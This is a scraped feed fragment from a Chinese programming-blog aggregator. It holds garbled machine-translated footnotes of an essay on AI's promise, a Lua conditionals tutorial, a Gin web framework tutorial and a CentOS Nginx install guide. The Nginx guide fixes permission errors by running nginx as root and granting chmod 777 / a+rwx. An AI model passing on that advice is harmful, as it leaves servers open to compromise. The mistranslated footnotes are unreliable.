之外的科学进展。↩11这些成就对我来说是一种启发，也许是最大的 强 人工智能用于改变生物学的现有示例。↩12“科学的进步取决于新技术、新发现和新 想法 可能按这个顺序。- 悉尼·布伦纳 ↩13感谢 Parag Mallick 提出这一点。↩14我不想用关于具体 前途 AI 支持的科学可以做出一些发现，但这里有一些头脑风暴 可能性：— 设计更好的计算工具，如 AlphaFold 和 AlphaProteo — 即通用 人工智能 系统加快了我们制作专用 AI 计算生物学工具的能力。— 更高效、更具选择性的 CRISPR。— 更先进的细胞疗法。— 材料科学和小型化突破带来更好的植入式 设备。— 更好地控制干细胞、细胞分化和去分化，以及 从而能够再生或重塑组织。— 更好地控制免疫系统：选择性地打开免疫系统以解决癌症问题 传染病，并选择性地关闭它以解决自身免疫性疾病。↩15当然，AI 也可能有助于更聪明地选择什么 experiments 来 运行：改进实验设计，从第一轮实验中学到更多东西 那 第二轮可以缩小关键问题的范围，依此类推。↩16感谢 Matthew Yglesias 提出这一点。↩17快速发展的疾病，如本质上是耐多药菌株 将医院作为进化实验室，不断改进其 电阻 到治疗，可能特别顽固地处理，并且可能是那种事情 那 阻止我们达到 100%。↩18请注意，可能很难知道我们已经将人类的寿命延长了一倍 这 5-10 年。虽然我们可能已经完成了它，但我们可能在研究中还不知道它 time-frame 的↩19这是我愿意的一个地方，尽管明显的生物学 差异 在治愈疾病和减缓衰老过程本身之间，而不是从 一个 在统计趋势上保持更大的距离，并说“即使细节是 不同，我 认为人类科学可能会找到一种方法来延续这一趋势;毕竟，平滑 任何复杂事物的趋势都必须通过非常异质的 组件。↩20举个例子，我被告知，生产率每年增长的 1% 甚至 0.5% 在与这些计划相关的预测中都是变革性的。如果 想法 在这篇文章中，生产力的提高可能比 这。↩21媒体喜欢把事情描绘得高大 地位 精神病患者，但一般的精神病患者可能是一个经济状况不佳的人 前景和冲动控制能力差，最终在监狱中度过了大量时间。↩22我认为这在某种程度上类似于许多（尽管可能不是）的事实 都 我们从可解释性中学到的结果将继续具有相关性 如果 我们当前人工神经网络的一些架构细节，例如 注意力机制，以某种方式被改变或替换。↩23我怀疑它有点像一个经典的混沌系统——被 不可简化的复杂性，必须以大部分去中心化的方式进行管理。 尽管正如我在本节后面所说，更温和的干预可能是可能的。一个 经济学家埃里克·布林约尔夫森 （Erik Brynjolfsson） 向我提出的反驳是，大公司 （例如 沃尔玛或优步）开始拥有足够的集中知识来理解 消费者 比任何去中心化过程都要好，也许迫使我们修改哈耶克的 关于谁拥有最好的本地知识的见解。↩24感谢 Kevin Esvelt 提出这一点。↩25例如，手机最初是富人的技术，但 迅速 变得非常便宜，同比改进发生得如此之快，以至于消除了任何 购买“豪华”手机的优势，今天大多数人都有类似的手机 质量。↩26这是兰德公司即将发表的一篇论文的标题，大致列出了 这 我描述的策略。↩27当普通人想到公共机构时，他们可能会想到 之 他们在 DMV、IRS、医疗保险或类似职能方面的经验。制作这些 经验 比现在更积极似乎是打击不正当的有力方法 玩世不恭。↩28事实上，在 AI 驱动的世界中，此类可能的挑战范围和 项目将比现在大得多。↩29我打破了我自己的规则，不把这些放在科幻小说上，但我做到了 发现 至少很难不提到它。事实是，科幻小说是其中之一 我们 只有关于未来的广泛思想实验的来源;我想它说 东西 糟糕的是，它与一种特定的狭隘亚文化如此紧密地纠缠在一起。↩http://www.ppmy.cn/news/1540846.html相关文章Lua条件语句软考鸭微信小程序 过软考,来软考鸭! 提供软考免费软考讲解视频、题库、软考试题、软考模考、软考查分、软考咨询等服务 在Lua编程语言中&amp;#xff0c;条件语句是控制程序执行流程的关键工具。它们允许开发者根据特定条件的真假来执行不同的代码块&amp;#xff0c;从而实现复杂的逻辑…阅读更多...【Golang】Gin框架：Go语言中的轻量级Web框架✨✨ 欢迎大家来到景天科技苑✨✨ 
&amp;#x1f388;&amp;#x1f388; 养成好习惯&amp;#xff0c;先赞后看哦~&amp;#x1f388;&amp;#x1f388; &amp;#x1f3c6; 作者简介&amp;#xff1a;景天科技苑 &amp;#x1f3c6;《头衔》&amp;#xff1a;大厂架构师&amp;#xff0c;华为云开发者社区专家博主&amp;#xff0c;…阅读更多...Centos安装Nginx 非Docker客户的机器属于 Centos7 系列&amp;#xff0c;由于其较为陈旧&amp;#xff0c;2024开始众多镜像和软件源都已失效。此篇文章将详细记录在 Centos7 操作系统上从零开始安装 Nginx 的整个流程。 
本文Nginx是安装在/usr/local/nginx下 
详细步骤如下&amp;#xff1a; 
准备Nginx安装包&amp;#x…阅读更多...Java之异常体系异常体系分类&amp;#xff1a; Error 错误Exception 异常错误和异常的继承关系&amp;#xff1a; 所有错误的父类为 Error 类所有异常的父类为 Exception 类Error 和 Exception 的父类为 ThrowableThrowable&amp;#xff1a;代表可抛出错误类型&amp;#xff1a; 编译错误&amp;#xff1a;由编译器找到…阅读更多...安装配置sqoop（超详细）前言 
sqoop就是sql-to-hadoop&amp;#xff0c;说通俗点&amp;#xff0c;我们用到最多的就是mysql与hive之间的数据传递&amp;#xff0c;而hive是依靠hadoop运行的&amp;#xff0c;所以要再mysql和hive之间互相传递数据&amp;#xff0c;就必须要安装sqoop 
一、准备 
我们要准备sqoop的安装包&amp;#…阅读更多...springboot+uinapp基于Android的固定资产借用管理平台文章目录 前言项目介绍技术介绍功能介绍核心代码数据库参考 系统效果图论文效果图 前言 
文章底部名片&amp;#xff0c;获取项目的完整演示视频&amp;#xff0c;免费解答技术疑问 
项目介绍 固定资产借用管理平台设计的目的是为用户提供使用申请、故障报修、设备归还、意见反馈等管理方…阅读更多...大数据-174 Elasticsearch Query DSL - 全文检索 full-text query 匹配、短语、多字段 详细操作点一下关注吧&amp;#xff01;&amp;#xff01;&amp;#xff01;非常感谢&amp;#xff01;&amp;#xff01;持续更新&amp;#xff01;&amp;#xff01;&amp;#xff01; 
目前已经更新到了&amp;#xff1a; 
Hadoop&amp;#xff08;已更完&amp;#xff09;HDFS&amp;#xff08;已更完&amp;#xff09;MapReduce&amp;#xff08;已更完&amp;am…阅读更多...【React】useLayoutEffect、useInsertionEffectuseLayoutEffect 
useLayoutEffect和useEffect有什么区别呢&amp;#xff1f; 
useEffect的cb&amp;#xff0c;准确来说&amp;#xff0c;是异步调用的&amp;#xff0c;会等主线程任务执行完成&amp;#xff0c;D0M更新&amp;#xff0c;JS执行完成&amp;#xff0c;视图绘制完成&amp;#xff0c;才执行。 
useLayout…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径python 进制、编码《代码大全2》读后感二《代码大全2》读后感三程序员修炼之道：跳出 “小工” 陷阱Amped DVRConv与引擎更新38103：音频转视频容器与解码增强使用 Kotlin 结合 Tesseract OCR 识别验证码Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 15:18:20 +0000</pubDate>
    </item>
    <item>
      <title>Lua条件语句</title>
      <link>https://www.ppmy.cn/news/1540845.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维Lua条件语句news/2025/10/31 23:18:18/软考鸭微信小程序 过软考,来软考鸭! 提供软考免费软考讲解视频、题库、软考试题、软考模考、软考查分、软考咨询等服务在Lua编程语言中，条件语句是控制程序执行流程的关键工具。它们允许开发者根据特定条件的真假来执行不同的代码块，从而实现复杂的逻辑判断。本文将深入探讨Lua中的条件语句，包括if语句、if...else结构、以及if...elseif...else链，并通过实例代码展示它们的应用。Lua条件语句基础Lua中的条件语句主要围绕if关键字展开，它可以根据一个或多个条件的真假来决定执行哪些代码。if语句最简单的形式是单独的if语句，用于在条件为真时执行特定代码块：ifconditionthen-- 当condition为真时执行的代码end示例：localnumber=10ifnumber&gt;5thenprint("Number is greater than 5")endif…else语句为了处理条件为假时的情况，我们可以使用if...else结构：ifconditionthen-- 当condition为真时执行的代码else-- 当condition为假时执行的代码end示例：localnumber=3ifnumber&gt;5thenprint("Number is greater than 5")elseprint("Number is not greater than 5")endif…elseif…else链当需要根据多个条件进行判断时，可以使用if...elseif...else链：ifcondition1then-- 当condition1为真时执行的代码elseifcondition2then-- 当condition2为真时执行的代码else-- 当所有条件都为假时执行的代码end示例：localscore=75ifscore&gt;=90thenprint("Excellent")elseifscore&gt;=60thenprint("Good")elseprint("Needs improvement")end深入理解与技巧逻辑运算符在条件语句中，我们经常使用逻辑运算符（如and、or、not）来组合或反转条件：and：当两个条件都为真时，结果为真。or：当至少一个条件为真时，结果为真。not：取反条件，如果条件为真，则结果为假，反之亦然。示例：locala=10localb=20ifa&gt;5andb&lt;30thenprint("Both conditions are true")endifa&lt;5orb&gt;25thenprint("At least one condition is true")endifnot(a==10)thenprint("a is not equal to 10")elseprint("a is equal to 10")end嵌套条件条件语句可以嵌套使用，即在一个条件语句的内部再包含另一个条件语句。这允许对更复杂的逻辑进行分层处理。示例：localx=10localy=20ifx&gt;5thenify&gt;15thenprint("Both x and y meet the conditions")elseprint("x meets the condition, but y does not")endelseprint("x does not meet the condition")end总结Lua中的条件语句提供了强大的逻辑判断能力，使得开发者能够根据程序的运行状态或用户输入来动态地执行不同的代码块。通过熟练掌握if、if...else、以及if...elseif...else结构，以及逻辑运算符和嵌套条件的使用，我们可以构建出复杂而灵活的程序逻辑。希望本文能够帮助你更好地理解和应用Lua中的条件语句。如果你有任何问题或需要进一步的解释，请随时留言讨论。http://www.ppmy.cn/news/1540845.html相关文章【Golang】Gin框架：Go语言中的轻量级Web框架✨✨ 欢迎大家来到景天科技苑✨✨ 
&amp;#x1f388;&amp;#x1f388; 养成好习惯&amp;#xff0c;先赞后看哦~&amp;#x1f388;&amp;#x1f388; &amp;#x1f3c6; 作者简介&amp;#xff1a;景天科技苑 &amp;#x1f3c6;《头衔》&amp;#xff1a;大厂架构师&amp;#xff0c;华为云开发者社区专家博主&amp;#xff0c;…阅读更多...Centos安装Nginx 非Docker客户的机器属于 Centos7 系列&amp;#xff0c;由于其较为陈旧&amp;#xff0c;2024开始众多镜像和软件源都已失效。此篇文章将详细记录在 Centos7 操作系统上从零开始安装 Nginx 的整个流程。 
本文Nginx是安装在/usr/local/nginx下 
详细步骤如下&amp;#xff1a; 
准备Nginx安装包&amp;#x…阅读更多...Java之异常体系异常体系分类&amp;#xff1a; Error 错误Exception 异常错误和异常的继承关系&amp;#xff1a; 所有错误的父类为 Error 类所有异常的父类为 Exception 类Error 和 Exception 的父类为 ThrowableThrowable&amp;#xff1a;代表可抛出错误类型&amp;#xff1a; 编译错误&amp;#xff1a;由编译器找到…阅读更多...安装配置sqoop（超详细）前言 
sqoop就是sql-to-hadoop&amp;#xff0c;说通俗点&amp;#xff0c;我们用到最多的就是mysql与hive之间的数据传递&amp;#xff0c;而hive是依靠hadoop运行的&amp;#xff0c;所以要再mysql和hive之间互相传递数据&amp;#xff0c;就必须要安装sqoop 
一、准备 
我们要准备sqoop的安装包&amp;#…阅读更多...springboot+uinapp基于Android的固定资产借用管理平台文章目录 前言项目介绍技术介绍功能介绍核心代码数据库参考 系统效果图论文效果图 前言 
文章底部名片&amp;#xff0c;获取项目的完整演示视频&amp;#xff0c;免费解答技术疑问 
项目介绍 固定资产借用管理平台设计的目的是为用户提供使用申请、故障报修、设备归还、意见反馈等管理方…阅读更多...大数据-174 Elasticsearch Query DSL - 全文检索 full-text query 匹配、短语、多字段 详细操作点一下关注吧&amp;#xff01;&amp;#xff01;&amp;#xff01;非常感谢&amp;#xff01;&amp;#xff01;持续更新&amp;#xff01;&amp;#xff01;&amp;#xff01; 
目前已经更新到了&amp;#xff1a; 
Hadoop&amp;#xff08;已更完&amp;#xff09;HDFS&amp;#xff08;已更完&amp;#xff09;MapReduce&amp;#xff08;已更完&amp;am…阅读更多...【React】useLayoutEffect、useInsertionEffectuseLayoutEffect 
useLayoutEffect和useEffect有什么区别呢&amp;#xff1f; 
useEffect的cb&amp;#xff0c;准确来说&amp;#xff0c;是异步调用的&amp;#xff0c;会等主线程任务执行完成&amp;#xff0c;D0M更新&amp;#xff0c;JS执行完成&amp;#xff0c;视图绘制完成&amp;#xff0c;才执行。 
useLayout…阅读更多...【Python】基础--文件处理在Python中&amp;#xff0c;文件处理涉及打开文件、读取文件内容、写入文件以及关闭文件等操作。以下是有关文件处理的基本知识&amp;#xff1a; 
1. 文件的打开 
在Python中&amp;#xff0c;可以使用内置的 open() 函数打开文件。open() 函数的基本语法如下&amp;#xff1a; 
file_object  ope…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径python 进制、编码《代码大全2》读后感二《代码大全2》读后感三程序员修炼之道：跳出 “小工” 陷阱Amped DVRConv与引擎更新38103：音频转视频容器与解码增强使用 Kotlin 结合 Tesseract OCR 识别验证码Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 15:18:18 +0000</pubDate>
    </item>
    <item>
      <title>【Golang】Gin框架：Go语言中的轻量级Web框架</title>
      <link>https://www.ppmy.cn/news/1540844.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维【Golang】Gin框架：Go语言中的轻量级Web框架news/2025/10/31 23:18:17/✨✨ 欢迎大家来到景天科技苑✨✨🎈🎈 养成好习惯，先赞后看哦~🎈🎈🏆 作者简介：景天科技苑🏆《头衔》：大厂架构师，华为云开发者社区专家博主，阿里云开发者社区专家博主，CSDN全栈领域优质创作者，掘金优秀博主，51CTO博客专家等。🏆《博客》：Python全栈，Golang开发，PyQt5和Tkinter桌面开发，小程序开发，人工智能，js逆向，App逆向，网络系统安全，数据分析，Django，fastapi，flask等框架，云原生K8S，linux，shell脚本等实操经验，网站搭建，数据库等分享。所属的专栏：Go语言开发零基础到高阶实战景天的主页：景天科技苑文章目录Go语言web框架Gin一、认识Gin1. 什么是Gin2. 同类框架对比分析二、我们为什么要学习web框架三、环境的准备和搭建1. 文档和go环境2. 项目搭建过程四、Gin安装使用1. 安装gin2. Gin框架的基本使用Go语言web框架Gin一、认识Gin1. 什么是GinGin是一个用Go语言编写的高性能HTTP web框架，它提供了快速的HTTP路由、中间件支持以及JSON编码等功能。Gin框架以其简洁的API和高效的性能著称，非常适合用来构建RESTful API和中小型Web应用。Gin：Go 语言编写的 Web 框架，以更好的性能实现类似 Martini 框架的 API。Gin是一个golang的net/http库封装的web微框架，封装比较优雅，API友好，源码注释比较明确。具有快速灵活，容错方便等特点。2. 同类框架对比分析Beego：开源的高性能 Go 语言 Web 框架。beego是一个快速开发Go应用的http框架，go 语言方面技术大牛。beego可以用来快速开发API、Web、后端服务等各种应用，是一个RESTFul的框架，主要设计灵感来源于tornado、sinatra、flask这三个框架，但是结合了Go本身的一些特性(interface、struct继承等)而设计的一个框架。Iris：全宇宙最快的 Go 语言 Web 框架。完备 MVC 支持，未来尽在掌握。Iris是一个快速,简单但功能齐全的和非常有效的web框架。提供了一个优美的表现力和容易使用你的下一个网站或API的基础。二、我们为什么要学习web框架作为初学者很多时候，在学习一个框架的时候，一定要搞清楚我们为什么要学习它，这个非常的重要。随着互联网技术的发展，在早期我们大部分情况下，编写的都是静态网页html。如果有100篇文章就要编写一百篇与之对应的静态网页。这样是非常痛苦的。于是乎开始有了动态网页，动态网页必须要结合服务器端的技术，比如：Go、Java等。有了这些服务端语言的加持这样就可以完成一个静态网页到动态网页的转化。如下图：如果假设我们这里选择的是：gin和gorm。用户在浏览器访问地址，这个地址其实是服务器提供。用于寻址一样。先找到服务器在哪里，我要访问服务器的什么如果根据ip找到地址以后，通过port找到服务器的服务，原来你是一个go的web服务。就开始进入到程序中把对应的逻辑去执行(这个部分未来是我们使用gin定义路由的对应的要执行的事情)在执行的逻辑中，我们肯定会调用gorm把数据库存储起来的数据，查询出来。把查询出来的数据，和你定义好的模板开始用对应的模板语法进行渲染和碰撞。最后就呈现出来了，一个完整的静态网页。这也就是经典的：B/S架构。B代表的是Broswer浏览器，S代表的是：Server是服务端也就是我们学习的GO三、环境的准备和搭建1. 文档和go环境Gin 官方文档地址：https://gin-gonic.com/zh-cn/docs/版本的要求：最低版本要求：1.162. 项目搭建过程1: 创建jt-gin工程2：创建项目的mod文件这个文件的作用就是：可以用来记录你未来安装的模块。方便进行统一管理。创建好以后：3：配置项目的环境检查GOROOT检查GOPATH添加下载代理，这是七牛云的代理，它把go的一些常用的库缓存到它的服务器上，配了代理直接就可以从国内下载，不配置的话大概率下载第三方库会失败复制GOPROXY=https://goproxy.cn,direct放入到Enironment中如下：一切准备就绪，接下来开始安装gin四、Gin安装使用Gin 官方文档地址：https://gin-gonic.com/zh-cn/docs/1. 安装gin在使用Gin框架之前，首先需要确保你的开发环境中已经安装了Go语言。访问Go官网下载适合你操作系统的安装包，并按照提示完成安装。配置好环境变量后，可以通过以下命令来安装Gin框架：在终端命令行执行如下命令：goget-u github.com/gin-gonic/gin这条命令会下载并安装Gin框架的最新版本到你的Go工作区中。检查是否安装成功如果看到这个就说明安装成功了2. Gin框架的基本使用创建第一个Gin程序新建一个HelloWorld.go文件，参考以下代码编写一个基本的Gin程序：官网有提供packagemainimport("github.com/gin-gonic/gin")funcmain(){// 创建gin服务,创建一个默认的路由引擎ginServer。然后可以根据ginServer.GET，ginServer.ROST，ginServer.DELETE等内置函数处理客户端发来的http请求。ginServer:=gin.Default()// localhost:8088/hello// 处理请求的函数 *gin.ContextginServer.GET("/hello",func(c*gin.Context){// c.JSON：响应给客户端JSON格式的数据 func (c *Context) JSON(code int, obj any)// gin.H : 参数 key value// gin.H 是一个便捷的快捷方式，你也可以直接使用 map[string]interface{} 来代替它c.JSON(200,gin.H{"message":"Hello world!"})})// 启动HTTP服务,可以修改端口。默认是8080端口ginServer.Run(":8088")}这段代码首先导入了Gin包，然后通过gin.Default()创建了一个默认的Gin引擎实例，它包含了默认的中间件（如日志记录和错误恢复）。接着，使用ginServer.GET(“/hello”)定义了一个GET请求的路由，当客户端请求根路径时，会执行匿名函数，其中c类型的gin.Context指针就是返回的内容，一般可以用c.HTML定义返回html文件，或者c.JSON返回JSON类型文件。JSON传参的格式是状态码code和空接口object；HTML是状态码code，模板名称name和空接口object。我们这里返回一个json字符串"Hello world!"。最后，通过ginServer.Run()启动Gin服务，我们监听8088端口。默认监听在8080端口。运行我们的框架，浏览器访问浏览器访问，能拿到数据，运行成功关于gin.H看下源码，就是 map[string] any引入 gin.H 这个东西可以简化生成 json 的方式，如果需要嵌套 json，那么嵌套 gin.H 就可以了。例子：c.JSON(http.StatusOK,gin.H{"status":gin.H{"code":http.StatusOK,"status":"登录成功",},"message":message})http://www.ppmy.cn/news/1540844.html相关文章Centos安装Nginx 非Docker客户的机器属于 Centos7 系列&amp;#xff0c;由于其较为陈旧&amp;#xff0c;2024开始众多镜像和软件源都已失效。此篇文章将详细记录在 Centos7 操作系统上从零开始安装 Nginx 的整个流程。 
本文Nginx是安装在/usr/local/nginx下 
详细步骤如下&amp;#xff1a; 
准备Nginx安装包&amp;#x…阅读更多...Java之异常体系异常体系分类&amp;#xff1a; Error 错误Exception 异常错误和异常的继承关系&amp;#xff1a; 所有错误的父类为 Error 类所有异常的父类为 Exception 类Error 和 Exception 的父类为 ThrowableThrowable&amp;#xff1a;代表可抛出错误类型&amp;#xff1a; 编译错误&amp;#xff1a;由编译器找到…阅读更多...安装配置sqoop（超详细）前言 
sqoop就是sql-to-hadoop&amp;#xff0c;说通俗点&amp;#xff0c;我们用到最多的就是mysql与hive之间的数据传递&amp;#xff0c;而hive是依靠hadoop运行的&amp;#xff0c;所以要再mysql和hive之间互相传递数据&amp;#xff0c;就必须要安装sqoop 
一、准备 
我们要准备sqoop的安装包&amp;#…阅读更多...springboot+uinapp基于Android的固定资产借用管理平台文章目录 前言项目介绍技术介绍功能介绍核心代码数据库参考 系统效果图论文效果图 前言 
文章底部名片&amp;#xff0c;获取项目的完整演示视频&amp;#xff0c;免费解答技术疑问 
项目介绍 固定资产借用管理平台设计的目的是为用户提供使用申请、故障报修、设备归还、意见反馈等管理方…阅读更多...大数据-174 Elasticsearch Query DSL - 全文检索 full-text query 匹配、短语、多字段 详细操作点一下关注吧&amp;#xff01;&amp;#xff01;&amp;#xff01;非常感谢&amp;#xff01;&amp;#xff01;持续更新&amp;#xff01;&amp;#xff01;&amp;#xff01; 
目前已经更新到了&amp;#xff1a; 
Hadoop&amp;#xff08;已更完&amp;#xff09;HDFS&amp;#xff08;已更完&amp;#xff09;MapReduce&amp;#xff08;已更完&amp;am…阅读更多...【React】useLayoutEffect、useInsertionEffectuseLayoutEffect 
useLayoutEffect和useEffect有什么区别呢&amp;#xff1f; 
useEffect的cb&amp;#xff0c;准确来说&amp;#xff0c;是异步调用的&amp;#xff0c;会等主线程任务执行完成&amp;#xff0c;D0M更新&amp;#xff0c;JS执行完成&amp;#xff0c;视图绘制完成&amp;#xff0c;才执行。 
useLayout…阅读更多...【Python】基础--文件处理在Python中&amp;#xff0c;文件处理涉及打开文件、读取文件内容、写入文件以及关闭文件等操作。以下是有关文件处理的基本知识&amp;#xff1a; 
1. 文件的打开 
在Python中&amp;#xff0c;可以使用内置的 open() 函数打开文件。open() 函数的基本语法如下&amp;#xff1a; 
file_object  ope…阅读更多...一文详解AI模型部署及工业落地方式最近在复盘今年上半年做的一些事情&amp;#xff0c;不管是训练模型、部署模型搭建服务&amp;#xff0c;还是写一些组件代码等&amp;#xff0c;零零散散是有一些产出。 
虽然有了一点点成果&amp;#xff0c;但仍觉着缺点什么。作为深度学习****算法工程师&amp;#xff0c;训练模型和部署模型是最基本…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径python 进制、编码《代码大全2》读后感二《代码大全2》读后感三程序员修炼之道：跳出 “小工” 陷阱Amped DVRConv与引擎更新38103：音频转视频容器与解码增强使用 Kotlin 结合 Tesseract OCR 识别验证码Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 15:18:18 +0000</pubDate>
    </item>
    <item>
      <title>Centos安装Nginx 非Docker</title>
      <link>https://www.ppmy.cn/news/1540842.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维Centos安装Nginx 非Dockernews/2025/10/31 23:18:16/客户的机器属于 Centos7 系列，由于其较为陈旧，2024开始众多镜像和软件源都已失效。此篇文章将详细记录在 Centos7 操作系统上从零开始安装 Nginx 的整个流程。本文Nginx是安装在/usr/local/nginx下详细步骤如下：准备Nginx安装包，安装包去官网下载即可，我选择的是Nginx1.10.1，Nginx安装包如下图所示：Nginx安装包下载完成后解压tar -zxvf nginx-1.10.1.tar.gz解压完成后进入到nginx目录，cd nginx-1.10.1/执行命令./configure --prefix=/usr/local/nginx执行完成后再分别执行make和sudo make install注意：在执行过程中若缺少Nginx相关依赖会报错，如缺少pcre、zlib-devel等依赖，可以根据提示通过yum安装即可，若yum的软件源无法使用，请先更换成国内可访问的软件源，如阿里云，可参见此文章结尾）安装完成后通过 ps -ef|grep nginx 查看进程是否有，若无则前往/sbin执行./nginx或./nginx -s reload启动启动完成后默认开启80端口 通过访问curl http://127.0.0.1查看有类似Welcome to Nginx的欢迎页说明就成功了。在安装过程中可能会遇到的问题：常见问题一、无法通过yum安装某些软件或依赖包把yum源更换掉，先备份，如下命令：sudo cp /etc/yum.repos.d/CentOS-Base.repo /etc/yum.repos.d/CentOS-Base.repo.bak然后执行命令替换：sudo wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo刷新sudo yum makecache常见问题二、安装完成后无法访问先检查Nginx启动后进程是否存在，命令：ps -ef|grep nginx若未启动则需要去sbin目录执行 ./nginx命令启动检查80端口是否开放，通过telnet命令查是否正常 若未开放 执行命令开放：sudo firewall-cmd --permanent --add-port=80/tcp然后执行sudo firewall-cmd --reload刷新防火墙即可常见问题三、安装完成后访问提示403 无权限检查启动nginx的帐户是否有权限，默认启动是nobody，需在nginx.conf更改为root即可，如下图：检查要访问的文件是否有权限，可通过chmod 777 [指定文件]授权可 执行chmod -R a+rwx [文件或目录]授权这就是我今天安装Nginx遇到的问题记录。2024.10http://www.ppmy.cn/news/1540842.html相关文章Java之异常体系异常体系分类&amp;#xff1a; Error 错误Exception 异常错误和异常的继承关系&amp;#xff1a; 所有错误的父类为 Error 类所有异常的父类为 Exception 类Error 和 Exception 的父类为 ThrowableThrowable&amp;#xff1a;代表可抛出错误类型&amp;#xff1a; 编译错误&amp;#xff1a;由编译器找到…阅读更多...安装配置sqoop（超详细）前言 
sqoop就是sql-to-hadoop&amp;#xff0c;说通俗点&amp;#xff0c;我们用到最多的就是mysql与hive之间的数据传递&amp;#xff0c;而hive是依靠hadoop运行的&amp;#xff0c;所以要再mysql和hive之间互相传递数据&amp;#xff0c;就必须要安装sqoop 
一、准备 
我们要准备sqoop的安装包&amp;#…阅读更多...springboot+uinapp基于Android的固定资产借用管理平台文章目录 前言项目介绍技术介绍功能介绍核心代码数据库参考 系统效果图论文效果图 前言 
文章底部名片&amp;#xff0c;获取项目的完整演示视频&amp;#xff0c;免费解答技术疑问 
项目介绍 固定资产借用管理平台设计的目的是为用户提供使用申请、故障报修、设备归还、意见反馈等管理方…阅读更多...大数据-174 Elasticsearch Query DSL - 全文检索 full-text query 匹配、短语、多字段 详细操作点一下关注吧&amp;#xff01;&amp;#xff01;&amp;#xff01;非常感谢&amp;#xff01;&amp;#xff01;持续更新&amp;#xff01;&amp;#xff01;&amp;#xff01; 
目前已经更新到了&amp;#xff1a; 
Hadoop&amp;#xff08;已更完&amp;#xff09;HDFS&amp;#xff08;已更完&amp;#xff09;MapReduce&amp;#xff08;已更完&amp;am…阅读更多...【React】useLayoutEffect、useInsertionEffectuseLayoutEffect 
useLayoutEffect和useEffect有什么区别呢&amp;#xff1f; 
useEffect的cb&amp;#xff0c;准确来说&amp;#xff0c;是异步调用的&amp;#xff0c;会等主线程任务执行完成&amp;#xff0c;D0M更新&amp;#xff0c;JS执行完成&amp;#xff0c;视图绘制完成&amp;#xff0c;才执行。 
useLayout…阅读更多...【Python】基础--文件处理在Python中&amp;#xff0c;文件处理涉及打开文件、读取文件内容、写入文件以及关闭文件等操作。以下是有关文件处理的基本知识&amp;#xff1a; 
1. 文件的打开 
在Python中&amp;#xff0c;可以使用内置的 open() 函数打开文件。open() 函数的基本语法如下&amp;#xff1a; 
file_object  ope…阅读更多...一文详解AI模型部署及工业落地方式最近在复盘今年上半年做的一些事情&amp;#xff0c;不管是训练模型、部署模型搭建服务&amp;#xff0c;还是写一些组件代码等&amp;#xff0c;零零散散是有一些产出。 
虽然有了一点点成果&amp;#xff0c;但仍觉着缺点什么。作为深度学习****算法工程师&amp;#xff0c;训练模型和部署模型是最基本…阅读更多...无人机：无线电波控制技术！一、无线电波控制技术 
通过无线电波与无人机上的接收机进行通信。当飞手在遥控器上操作控制杆时&amp;#xff0c;这些动作会被转换为无线电波信号&amp;#xff0c;并发送给无人机上的接收机。接收机接收到信号后&amp;#xff0c;会解读控制杆的位移&amp;#xff0c;并将其转化为数字信号&amp;#…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 